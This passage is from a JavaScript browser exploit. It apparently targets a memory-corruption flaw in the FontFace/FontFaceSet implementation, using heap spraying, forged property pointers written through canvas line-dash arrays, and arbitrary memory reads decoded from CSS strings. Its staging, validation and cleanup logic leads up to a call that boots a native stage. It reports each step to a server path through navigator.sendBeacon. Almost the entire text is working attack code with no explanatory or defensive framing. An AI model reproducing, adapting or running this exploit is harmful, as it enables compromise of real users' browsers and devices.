  }
  if (!controls_valid()) {
    verdict('INVALID_CONTROL_POST_' + tag, 'fail');
    return false;
  }
  return true;
}

function scan_contexts(tag, mode) {
  const hits = [];
  const unexpected = [];
  let baseline = 0;
  let scanned = 0;
  for (let idx = 0; idx < carrier_contexts.length; idx++) {
    let a;
    try {
      a = carrier_contexts[idx].getLineDash();
    } catch (e) {
      unexpected.push(idx + ':exception-' + e.name);
      break;
    }
    scanned++;
    if (!a || a.length !== 10) {
      unexpected.push(idx + ':len-' + (a ? a.length : 'null'));
      break;
    }
    const bb = [];
    for (let bi = 0; bi < 10; bi++) bb.push(float64_bits(a[bi]));
    const fixed =
      bits_match(bb[1], BASE1_LOW, BASE1_HIGH) &&
      bits_match(bb[3], 0, 0) &&
      bits_match(bb[5], BASE1_LOW, BASE1_HIGH) &&
      bits_match(bb[7], 0, 0) &&
      bits_match(bb[8], 0, 0) &&
      bits_match(bb[9], 0, 0);
    const second_hit =
      fixed && bits_match(bb[0], BASE0_LOW, BASE0_HIGH) && bits_match(bb[2], 0, 0) && bits_match(bb[4], HIT0_LOW, HIT0_HIGH) && bucket_ok(bb[6]);
    const base =
      fixed &&
      bits_match(bb[0], BASE0_LOW, BASE0_HIGH) &&
      bits_match(bb[2], 0, 0) &&
      bits_match(bb[4], BASE0_LOW, BASE0_HIGH) &&
      bits_match(bb[6], 0, 0);
    if (base) baseline++;
    else if (mode === 'second' && second_hit) hits.push(idx);
    else if (unexpected.length < 6)
      unexpected.push(
        idx +
          ':q0=' +
          hex32(bb[0].hi) +
          hex32(bb[0].lo) +
          ':q1=' +
          hex32(bb[1].hi) +
          hex32(bb[1].lo) +
          ':q4=' +
          hex32(bb[4].hi) +
          hex32(bb[4].lo) +
          ':q5=' +
          hex32(bb[5].hi) +
          hex32(bb[5].lo),
      );
  }
  beacon('CTX_SCAN', `tag=${tag}|mode=${mode}|hits=${hits.join(',')}|baseline=${baseline}|scanned=${scanned}|unexpected=${unexpected.join(',')}`);
  return {
    clean: unexpected.length === 0 && scanned === carrier_contexts.length,
    hits: hits,
    unexpected: unexpected,
    baseline: baseline,
  };
}
function pristine_strings(tag) {
  const snap = snapshot_strings(),
    hits = find_string_ptr(),
    sv = strings_valid();
  let header = true;
  for (let i = 0; i < spray_strings.length; i++) {
    const s = spray_strings[i];
    if (
      read_u32_string(s, HASH_TABLE_OFFSET - 16) !== 0 ||
      read_u32_string(s, HASH_TABLE_OFFSET - 12) !== 0 ||
      read_u32_string(s, HASH_TABLE_OFFSET - 8) !== 0 ||
      read_u32_string(s, HASH_TABLE_OFFSET - 4) !== HASH_TABLE_SIZE
    ) {
      header = false;
      break;
    }
    for (let j = 0; j < 8; j++)
      if (s.charCodeAt(HASH_TABLE_OFFSET + j) !== 0) {
        header = false;
        break;
      }
    if (!header) break;
  }
  beacon('STRING_PRE', 'tag=' + tag + '|hits=' + hits.length + '|valid=' + (sv.ok ? 1 : 0) + '|header=' + (header ? 1 : 0));
  return { ok: hits.length === 0 && sv.ok && header, hits: hits, header: header, snap: snap };
}
function read_u32_string(s, o) {
  return (s.charCodeAt(o) | (s.charCodeAt(o + 1) << 8) | (s.charCodeAt(o + 2) << 16) | (s.charCodeAt(o + 3) << 24)) >>> 0;
}

function dash_words(index) {
  const a = carrier_contexts[index].getLineDash(),
    out = [];
  if (!a || a.length !== 10) return null;
  for (let i = 0; i < 10; i++) out.push(float64_bits(a[i]));
  return out;
}
function exact_baseline(words) {
  if (!words || words.length !== 10) return false;
  return (
    bits_match(words[0], BASE0_LOW, BASE0_HIGH) &&
    bits_match(words[1], BASE1_LOW, BASE1_HIGH) &&
    bits_match(words[2], 0, 0) &&
    bits_match(words[3], 0, 0) &&
    bits_match(words[4], BASE0_LOW, BASE0_HIGH) &&
    bits_match(words[5], BASE1_LOW, BASE1_HIGH) &&
    bits_match(words[6], 0, 0) &&
    bits_match(words[7], 0, 0) &&
    bits_match(words[8], 0, 0) &&
    bits_match(words[9], 0, 0)
  );
}
function drop_calibration_client() {
  let had = false,
    removed = false,
    still = true,
    err = null;
  try {
    had = font_sets[0].has(target) === true;
    removed = font_sets[0].delete(target) === true;
    still = font_sets[0].has(target) === true;
  } catch (e) {
    err = e;
  }
  disarm_face();
  beacon('CAL_DROP', 'had=' + (had ? 1 : 0) + '|removed=' + (removed ? 1 : 0) + '|still=' + (still ? 1 : 0) + '|disarmed=1');
  if (err) {
    verdict('CAL_DROP_EXCEPTION|' + err.name, 'fail');
    return false;
  }
  if (!had || !removed || still) {
    verdict('CAL_DROP_FAILED|had=' + (had ? 1 : 0) + '|removed=' + (removed ? 1 : 0) + '|still=' + (still ? 1 : 0), 'fail');
    return false;
  }
  if (!controls_valid()) {
    verdict('INVALID_CONTROL_POST_CAL_DROP', 'fail');
    return false;
  }
  return true;
}

function run_calibration() {
  if (terminal) return;
  if (!controls_valid()) {
    verdict('INVALID_CONTROL_PRE_CAL', 'fail');
    return;
  }
  const pre_strings = pristine_strings('CAL');
  if (pre_strings.hits.length) {
    verdict('INVALID_PREEXISTING_STRING|hits=' + pre_strings.hits.length, 'fail');
    return;
  }
  if (!pre_strings.header) {
    verdict('INVALID_TABLE_HEADER', 'fail');
    return;
  }
  if (!pre_strings.ok) {
    verdict('INVALID_PRECONTROL_STRING', 'fail');
    return;
  }
  const pre_contexts = scan_contexts('CAL_PRE', 'baseline');
  if (!pre_contexts.clean || pre_contexts.baseline !== STREAM_PAIR_COUNT) {
    verdict(
      'INVALID_PREEXISTING_CARRIER|baseline=' +
        pre_contexts.baseline +
        '|unexpected=' +
        pre_contexts.unexpected.length,
      'fail',
    );
    return;
  }
  const page0 = page_base_of(victim_table) + 0x4000,
    slot0 = page0 + 0xa0,
    T0 = slot0 + 0x30;
  const real_chunk = victim_table - (victim_table % CHUNK_SIZE);
  if (page0 >= real_chunk + CHUNK_SIZE) {
    verdict('INCONCLUSIVE_CAL_TARGET_CHUNK_BOUNDARY|victimTable=0x' + hex64(victim_table) + '|page0=0x' + hex64(page0), 'fail');
    return;
  }
  beacon('CAL_TARGET', 'page0=0x' + hex64(page0) + '|slot=0|table=0x' + hex64(T0));
  if (!add_with(0, 'CAL_ADD', T0)) return;
  const post_strings = snapshot_strings(),
    sd = string_delta(pre_strings.snap, post_strings),
    sh = sd.hits;
  beacon('STRING_SCAN', 'hits=' + sh.length + (sh.length ? '|idx=' + sh[0].idx + '|off=' + sh[0].off + '|val=' + sh[0].val : ''));
  if (!sd.ok) {
    verdict('STRING_DELTA_INVALID|why=' + sd.why + '|hits=' + sh.length, 'fail');
    return;
  }
  if (!drop_calibration_client()) return;

  const direct = scan_contexts('CAL_POST', 'second');
  let branch = '';
  let idx = -1;
  let plan = null;
  let derived = null;
  if (!direct.clean) {
    verdict('INVALID_CARRIER_MUTATION|unexpected=' + direct.unexpected.length, 'fail');
    return;
  }
  if (sh.length === 1 && direct.hits.length === 0 && direct.baseline === STREAM_PAIR_COUNT) {
    branch = 'string';
    idx = sh[0].idx;
    if (idx !== early_string_index) {
      verdict('INCONCLUSIVE_CAL_INDEX_DRIFT|got=' + idx + '|want=' + early_string_index, 'fail');
      return;
    }
    const measured = T0 - 20 - sh[0].off;
    if (measured !== slot0) {
      verdict('CAL_GEOMETRY_MISMATCH|base=0x' + hex64(measured) + '|slot0=0x' + hex64(slot0), 'fail');
      return;
    }
  } else if (sh.length === 0 && direct.hits.length === 1 && direct.baseline === STREAM_PAIR_COUNT - 1) {
    branch = 'dash';
    idx = direct.hits[0];
    if (idx !== early_dash_index) {
      verdict('INCONCLUSIVE_DIRECT_DASH_INDEX_DRIFT|got=' + idx + '|want=' + early_dash_index, 'fail');
      return;
    }
  } else if (sh.length === 0 && direct.hits.length === 0 && direct.baseline === STREAM_PAIR_COUNT) {
    verdict('INCONCLUSIVE_PAGE_RELATION|branch=next|stringHits=0|dashHits=0', 'fail');
    return;
  } else {
    verdict('INVALID_PHASE_TRANSITION|stringHits=' + sh.length + '|dashHits=' + direct.hits.length + '|baseline=' + direct.baseline, 'fail');
    return;
  }

  if (!early_plans || !early_plans[branch]) {
    verdict('INCONCLUSIVE_NO_EARLY_PLAN', 'fail');
    return;
  }
  plan = early_plans[branch];
  derived = make_phase_plan(branch, page0, idx);
  if (
    !same_phase_plan(plan, derived) ||
    plan.winner !== early_winner ||
    plan.victim_table !== early_real_table ||
    plan.wrapper !== early_wrapper
  ) {
    verdict('EARLY_PLAN_GEOMETRY_DRIFT|branch=' + branch, 'fail');
    return;
  }
  beacon(
    'SPLIT_TARGET',
    `branch=${branch}|calIndex=${idx}|chunk=0x${hex64(victim_table - (victim_table % CHUNK_SIZE))}|packedProperties=0x${hex64(plan.packed_properties)}|packedSource=0x${hex64(plan.packed_source)}|allocBase=0x${hex64(plan.alloc_base)}|graphBase=0x${hex64(plan.bases[0])}|postChecks=72`,
  );
  run_preplaced_graph(idx, plan);
}

function find_winner() {
  for (let i = 0; i < carrier_fill; i++) if (ptr_at(carrier_views[i], WRAPPER_OFFSET) && has_non_zero(carrier_views[i], TABLE_OFFSET)) return i;
  return -1;
}
function target_from(fs) {
  if (!fs) return null;
  for (let i = 0; i < fs.length; i++) if (fs[i] && fs[i] !== probe_face) return fs[i];
  return null;
}

function scan() {
  if (scan_started || terminal) return;
  scan_started = true;
  beacon(
    'SCAN_ENTER',
    `resolved=${resolved}|then=${then_getter_fired}|thenJob=${then_job_executed}|faceSpray=${carrier_fill}|strings=${spray_strings.length}|copies=${STREAM_PAIR_COUNT}|stages=${stage_strings.length}`,
  );
  if (early_error) {
    verdict('INCONCLUSIVE_' + early_error, 'fail');
    return;
  }
  if (!early_plans || !then_job_executed) {
    verdict('INCONCLUSIVE_NO_EARLY_PLAN', 'fail');
    return;
  }
  winner = find_winner();
  if (winner < 0) {
    verdict('INCONCLUSIVE_FACE_RECLAIM_MISS', 'fail');
    return;
  }
  winner_view = carrier_views[winner];
  target = target_from(loaded_faces);
  if (!target) {
    verdict('NO_TARGET|winner=' + winner, 'fail');
    return;
  }
  victim_table = read_qword(winner_view, TABLE_OFFSET);
  const wrap = read_qword(winner_view, WRAPPER_OFFSET);
  if (victim_table < 0x1000000000 || victim_table > 0x1002000000) {
    verdict('BAD_REAL_TABLE|winner=' + winner, 'fail');
    return;
  }
  if ((victim_table - 0x10) % 16 !== 0) {
    verdict('BAD_TABLE_ALIGN16|table=0x' + hex64(victim_table), 'fail');
    return;
  }
  if (
    winner !== early_winner ||
    victim_table !== early_real_table ||
    wrap !== early_wrapper ||
    early_plans.string.winner !== winner ||
    early_plans.dash.winner !== winner ||
    early_plans.string.victim_table !== victim_table ||
    early_plans.dash.victim_table !== victim_table ||
    early_plans.string.wrapper !== wrap ||
    early_plans.dash.wrapper !== wrap
  ) {
    verdict('EARLY_IDENTITY_DRIFT|early=' + early_winner + '|late=' + winner, 'fail');
    return;
  }
  beacon(
    'WINNER',
    'idx=' +
      winner +
      '|table=0x' +
      hex64(victim_table) +
      '|wrapper=' +
      hex_qword(winner_view, WRAPPER_OFFSET) +
      '|tableOff=0x' +
      hex64(victim_table & 0x3fff) +
      '|stringIdx=' +
      early_string_index +
      '|dashIdx=' +
      early_dash_index,
  );
  setTimeout(run_calibration, 25);
}

//#endregion

//#region Packed graph
function run_preplaced_graph(idx, plan) {
  flush_beacons();
  if (idx < 0 || idx + 5 >= STREAM_PAIR_COUNT) {
    verdict('INCONCLUSIVE_SPLIT_BOUNDARY|idx=' + idx, 'fail');
    return;
  }
  if (!exact_baseline(dash_words(idx + 4)) || !exact_baseline(dash_words(idx + 5))) {
    verdict('INVALID_SPLIT_BASELINE|idx=' + idx, 'fail');
    return;
  }
  const properties_context = carrier_contexts[idx + 4];
  const source_context = carrier_contexts[idx + 5];
  const carrier_snapshot = snapshot_carrier();

  const packed_properties = plan.packed_properties;
  const packed_source = plan.packed_source;
  const read_target_1 = plan.wrapper;
  let read_target_2 = 0;
  let read_target_3 = 0;
  const loc = [];
  const family_name = 'p1242e_' + hex32(KEY_NONCE) + '_' + idx;
  let font_css = '';
  const queries = [];
  const before = [];
  let source_host_before = null;

  let decoded_1 = null;
  let decoded_2 = null;
  let decoded_3 = null;
  let weak_ref = 0;
  let weak_face = 0;
  let backing = 0;
  let loaded_promise = 0;

  let marker_expected = null;
  let marker_after = null;
  let packed_snapshot = null;
  let packed_before = null;
  let packed_after = null;
  let packed_restored = false;

  let add_attempted = false;
  let registered = false;
  let detached = false;
  let display_1 = false;
  let display_2 = false;
  let v_cached_1 = false;
  let v_cached_2 = false;
  let v_cached_3 = false;
  let err = null;
  let cleanup_error = null;
  let cleanup_safe = false;
  let cleanup_carrier = false;
  let cleanup_base4 = false;
  let cleanup_base5 = false;
  let cleanup_source = false;
  let cleanup_marker = false;

  for (let li = 0; li < 6; li++) loc[li] = { payload: plan.payloads[li] };
  for (let qi = 0; qi < 12; qi++)
    queries[qi] = {
      one: { hit: scalar_string(STAGE_MARKERS[qi]), lo: scalar_string(STAGE_MARKERS[qi] - 1), hi: scalar_string(STAGE_MARKERS[qi] + 1) },
      two: { hit: scalar_string(STAGE_MARKERS_2[qi]), lo: scalar_string(STAGE_MARKERS_2[qi] - 1), hi: scalar_string(STAGE_MARKERS_2[qi] + 1) },
    };
  try {
    if (stage_strings.length !== 12 || plan.all_chars.length !== 12) throw new Error('STAGE_COUNT');
    for (let bi = 0; bi < 12; bi++) {
      before[bi] = string_bytes(stage_strings[bi]);
      if (!bytes_equal(before[bi], plan.all_chars[bi])) throw new Error('STAGE_' + STAGE_NAMES[bi] + '_CONTENT_PRE');
    }
    source_host_before = string_bytes(spray_strings[idx + 5]);
    if (source_host_before[56] !== 2 || source_host_before[57] !== 0 || source_host_before[58] !== 0 || source_host_before[59] !== 0)
      throw new Error('SPLIT_REFCOUNT_TAIL');
    const tail1 = split_tail_dash(read_target_1);
    if (!tail1) throw new Error('WEAKPTR_TARGET_NOT_ENCODABLE');
    properties_context.setLineDash(FAKE_PROPERTIES);
    source_context.setLineDash(tail1);
    if (!exact_fake_properties(properties_context.getLineDash()) || !exact_split_tail(source_context.getLineDash(), read_target_1))
      throw new Error('FIRST_CARRIER_ENCODING');
    configure_map_face(packed_properties);
    target.family = family_name;
    font_css = '1em "' + family_name + '"';
    const fp = read_qword(winner_view, FAMILY_OFFSET);
    if (String(target.family) !== family_name || fp < 0x1000000000 || fp > 0x1002000000) throw new Error('FAMILY_BOOTSTRAP');
    add_attempted = true;
    font_sets[2].add(target);
    registered = font_sets[2].has(target) === true;
    if (!registered) throw new Error('CONSUMER_REGISTRATION');

    let marker_ok = true;
    let marker_fail = -1;
    let marker_want = 0;
    for (let mi = 0; mi < 12; mi++) {
      const mp = plan.all_bases[mi] + 20 + MARKER_OFFSET;
      if (!range_exact(font_css, queries[mi].one, mp) || !range_exact(font_css, queries[mi].two, mp + 8)) {
        marker_ok = false;
        marker_fail = mi;
        marker_want = mp;
        break;
      }
    }
    clear_ranges();
    if (!marker_ok) {
      const found = [];
      for (let g = idx - 6; g <= idx + 6; g++) {
        if (g < 0 || g + 5 >= STREAM_PAIR_COUNT) continue;
        const candidate = make_phase_plan(plan.branch, plan.page0, g);
        let candidate_ok = true;
        for (let mi = 0; candidate_ok && mi < 12; mi++) {
          const mp = candidate.all_bases[mi] + 20 + MARKER_OFFSET;
          if (!range_exact(font_css, queries[mi].one, mp) || !range_exact(font_css, queries[mi].two, mp + 8)) candidate_ok = false;
        }
        clear_ranges();
        if (candidate_ok) found.push(g);
      }
      throw new Error(
        'STAGE_ADDRESS_VALIDATION|mi=' + marker_fail + '|want=0x' + hex64(marker_want) + '|idx=' + idx + '|match=' + (found.join(',') || 'none'),
      );
    }
    beacon(
      'STAGE_VALIDATE',
      `branch=${plan.branch}|checks=72|V1=0x${hex64(loc[0].payload)}|C1=0x${hex64(loc[1].payload)}|A1=0x${hex64(loc[2].payload)}|V2=0x${hex64(loc[3].payload)}|C2=0x${hex64(loc[4].payload)}|A2=0x${hex64(loc[5].payload)}|emitBeacon=0x${hex64(packed_source - 4)}`,
    );

    put64(winner_view, PROPERTY_POINTER_OFFSET, loc[2].payload);
    put64(winner_view, PROPERTY_TAG_OFFSET, 0);
    display_1 = true;
    decoded_1 = decode_css_string(String(target.display));
    weak_ref = decoded_1 && decoded_1.length === 16 ? read_uint32(decoded_1, 0) : 0;
    weak_face = decoded_1 && decoded_1.length === 16 ? read_qword(decoded_1, 8) : 0;
    if (weak_ref < 1 || weak_ref > 0x100000 || weak_face < 0x1000000000 || weak_face > 0x1002000000 || weak_face % 8 !== 0)
      throw new Error('WEAKPTR_SHAPE_FIRST');

    read_target_2 = weak_face + 0x10;
    const tail2 = split_tail_dash(read_target_2);
    if (!tail2) throw new Error('BACKING_TARGET_NOT_ENCODABLE');
    source_context.setLineDash(tail2);
    if (!exact_split_tail(source_context.getLineDash(), read_target_2)) throw new Error('SECOND_CARRIER_ENCODING');
    clear_ranges();
    put64(winner_view, PROPERTY_POINTER_OFFSET, loc[5].payload);
    put64(winner_view, PROPERTY_TAG_OFFSET, 0);
    display_2 = true;
    decoded_2 = decode_css_string(String(target.display));
    if (!decoded_2 || decoded_2.length !== 16) throw new Error('SECOND_DECODE');
    backing = read_qword(decoded_2, 0);
    loaded_promise = read_qword(decoded_2, 8);
    if (
      backing < 0x1000000000 ||
      backing > 0x1002000000 ||
      backing % 8 !== 0 ||
      loaded_promise < 0x1000000000 ||
      loaded_promise > 0x1002000000 ||
      loaded_promise % 8 !== 0
    )
      throw new Error('BACKING_SHAPE_SECOND');

    read_target_3 = backing + ID_OFFSET;
    packed_snapshot = snapshot_carrier();
    marker_expected = packed_snapshot.slice(ID_OFFSET, ID_OFFSET + 16);
    if (read_uint32(marker_expected, 0) !== (0x63000000 + early_winner) >>> 0) throw new Error('WINNER_MARKER_ID_PRE');
    for (let mk = 4; mk < 16; mk++) if (marker_expected[mk] !== 0) throw new Error('WINNER_MARKER_TAIL_PRE');
    try {
      pack_read_graph(backing, read_target_3, 16);
      if (!exact_packed_graph(backing, read_target_3)) throw new Error('PACKED_GRAPH_ENCODING');
      packed_before = snapshot_carrier();
      decoded_3 = decode_css_string(String(target.display));
      packed_after = snapshot_carrier();
      v_cached_3 = only_packed_v_cached_bit_changed(packed_before, packed_after);
    } finally {
      restore_carrier(packed_snapshot);
      packed_restored = carrier_matches(packed_snapshot);
    }
    if (!packed_restored) throw new Error('PACKED_CARRIER_RESTORE');
  } catch (e) {
    err = e;
  }
  try {
    clear_ranges();
    put64(winner_view, PROPERTY_POINTER_OFFSET, packed_properties);
    put64(winner_view, PROPERTY_TAG_OFFSET, 0);
    let owns = false,
      del_ok = false,
      still = add_attempted;
    if (add_attempted) {
      owns = font_sets[2].has(target) === true;
      if (owns) del_ok = font_sets[2].delete(target) === true;
      still = font_sets[2].has(target) === true;
    }
    detached = !still && (!owns || del_ok);
    if (detached) {
      clear_clients();
      properties_context.setLineDash(DASH);
      source_context.setLineDash(DASH);
      restore_carrier(carrier_snapshot);
      let stable = stage_strings.length === before.length;
      for (let si = 0; stable && si < stage_strings.length; si++) {
        const now = string_bytes(stage_strings[si]);
        if (si === plan.graph_skip && display_1) {
          v_cached_1 = only_v_cached_bit_changed(before[si], now);
          stable = v_cached_1 || bytes_equal(before[si], now);
        } else if (si === plan.graph_skip + 3 && display_2) {
          v_cached_2 = only_v_cached_bit_changed(before[si], now);
          stable = v_cached_2 || bytes_equal(before[si], now);
        } else stable = bytes_equal(before[si], now);
      }
      marker_after = snapshot_carrier().slice(ID_OFFSET, ID_OFFSET + 16);
      const source_host_after = string_bytes(spray_strings[idx + 5]);
      cleanup_carrier = carrier_matches(carrier_snapshot);
      cleanup_base4 = exact_baseline(dash_words(idx + 4));
      cleanup_base5 = exact_baseline(dash_words(idx + 5));
      cleanup_source = bytes_equal(source_host_before, source_host_after);
      cleanup_marker = bytes_equal(marker_expected, marker_after);
      cleanup_safe = cleanup_carrier && cleanup_base4 && cleanup_base5 && stable && cleanup_source && cleanup_marker;
    }
  } catch (e2) {
    cleanup_error = e2;
  }
  if (!cleanup_safe) {
    verdict(
      'PACKED_CLEANUP_UNSAFE|err=' +
        (err ? String(err.message || err.name).slice(0, 90) : 'none') +
        '|cerr=' +
        (cleanup_error ? String(cleanup_error.message || cleanup_error.name).slice(0, 40) : 'none') +
        '|add=' +
        (add_attempted ? 1 : 0) +
        '|reg=' +
        (registered ? 1 : 0) +
        '|det=' +
        (detached ? 1 : 0) +
        '|car=' +
        (cleanup_carrier ? 1 : 0) +
        '|b4=' +
        (cleanup_base4 ? 1 : 0) +
        '|b5=' +
        (cleanup_base5 ? 1 : 0) +
        '|src=' +
        (cleanup_source ? 1 : 0) +
        '|mk=' +
        (cleanup_marker ? 1 : 0),
      'fail',
    );
    return;
  }
  beacon(
    'PACKED_SELF_READ',
    `branch=${plan.branch}|idx=${idx}|weakTarget=0x${hex64(read_target_1)}|backingTarget=0x${hex64(read_target_2)}|backing=0x${hex64(backing)}|markerTarget=0x${hex64(read_target_3)}|markerExpected=${marker_expected ? hex_bytes(marker_expected) : 'none'}|markerRead=${decoded_3 ? hex_bytes(decoded_3) : 'decode-fail'}|packedA=0x${hex64(backing + PACK_NODE_A)}|packedRestored=${packed_restored ? 1 : 0}|checks=72|faceCleanup=1|cacheEntryRetained=1|oneLoadOnly=1`,
  );
  if (cleanup_error) {
    verdict('PACKED_CLEANUP_EXCEPTION_SAFE|' + String(cleanup_error.message || cleanup_error.name).slice(0, 100), 'fail');
    return;
  }
  if (err) {
    verdict('PACKED_EXCEPTION_SAFE|' + String(err.message || err.name).slice(0, 100), 'fail');
    return;
  }
  if (!decoded_1 || decoded_1.length !== 16 || !decoded_2 || decoded_2.length !== 16 || !decoded_3 || decoded_3.length !== 16) {
    verdict(
      `PACKED_DECODE_INVALID|first=${decoded_1 ? decoded_1.length : -1}|second=${decoded_2 ? decoded_2.length : -1}|third=${decoded_3 ? decoded_3.length : -1}`,
      'fail',
    );
    return;
  }
  if (!v_cached_1 || !v_cached_2 || !v_cached_3) {
    verdict(
      'PACKED_CACHE_WITNESS_MISSING|first=' + (v_cached_1 ? 1 : 0) + '|second=' + (v_cached_2 ? 1 : 0) + '|third=' + (v_cached_3 ? 1 : 0),
      'fail',
    );
    return;
  }
  if (!bytes_equal(decoded_3, marker_expected)) {
    verdict('PACKED_MARKER_MISMATCH|expected=' + hex_bytes(marker_expected) + '|read=' + hex_bytes(decoded_3), 'fail');
    return;
  }
  boot_native_stage({
    backing: backing,
    weak_face: weak_face,
    loaded_promise: loaded_promise,
    packed_properties: packed_properties,
    family_name: family_name,
    properties_context: properties_context,
  }).catch((error) => verdict('STAGE_BOOT|' + String((error && error.message) || error).slice(0, 120), 'fail'));
}

//#endregion

//#region Entry
function beacon(tag, data) {
  if (beacon_count >= BEACON_CAPACITY) return;

  BEACON_TAGS[beacon_count] = tag;
  BEACON_DATA[beacon_count] = data;
  beacon_count++;
}

function flush_beacons() {
  const count = beacon_count;
  beacon_count = 0;

  for (let i = 0; i < count; i++) {
    try {
      navigator.sendBeacon(`/beacon/${BEACON_TAGS[i]}`, BEACON_DATA[i]);
    } catch (error) {}
  }
}

function verdict(value, kind) {
  settle(value, kind === 'pass');
}

function fail_after(ms) {
  setTimeout(() => {
    if (!terminal) verdict('INCONCLUSIVE_TIMEOUT', 'fail');
  }, ms);
}

function check_environment() {
  if (
    typeof FontFace === 'undefined' ||
    typeof FontFaceSet !== 'function' ||
    !document.fonts ||
    typeof document.fonts.load !== 'function' ||
    !FontFaceSet.prototype ||
    typeof FontFaceSet.prototype.add !== 'function' ||
    typeof FontFaceSet.prototype.has !== 'function' ||
    typeof FontFaceSet.prototype.delete !== 'function' ||
    typeof FontFaceSet.prototype.check !== 'function' ||
    typeof ArrayBuffer === 'undefined' ||
    typeof Uint8Array === 'undefined' ||
    typeof Uint32Array === 'undefined' ||
    typeof Float64Array === 'undefined' ||
    typeof TextEncoder === 'undefined' ||
    typeof TextDecoder === 'undefined' ||
    typeof BigInt === 'undefined' ||
    typeof DataView === 'undefined' ||
    typeof Promise === 'undefined' ||
    typeof atob === 'undefined'
  ) {
    verdict('MISSING_API', 'fail');
    return false;
  }

  return true;
}

function start_exploit() {
  if (started) return;
  started = true;

  beacon('LOAD_ENTER', 'arm=trigger');

  try {
    document.fonts.load('1em a, x', 'AB').then(
      (faces) => {
        if (terminal) return;
        loaded_faces = faces;
        resolved = true;
        beacon('RESOLVE', `faces=${faces ? faces.length : 'null'}`);
        scan();
      },
      (error) => {
        if (terminal) return;
        resolved = true;
        beacon('REJECT', String((error && error.message) || error));
        scan();
      },
    );
  } catch (error) {
    verdict('LOAD_EXCEPTION|' + error.name, 'fail');
  }

  setTimeout(() => {
    if (terminal || scan_started) return;

    if (!then_job_executed) {
      verdict('INCONCLUSIVE_NO_THENABLE_JOB|then=' + then_getter_fired + '|faces=' + carrier_fill, 'fail');
    } else if (then_getter_fired && carrier_fill) {
      scan();
    } else {
      verdict('INCONCLUSIVE_NO_TRIGGER|then=' + then_getter_fired + '|resolved=' + resolved, 'fail');
    }
  }, 20000);
}

async function arw_main() {
  if (!check_environment()) return userland_done;
  if (!init_fontface()) return userland_done;

  logger.info('trigger armed');
  setTimeout(start_exploit, 16);

  return userland_done;
}
//#endregion
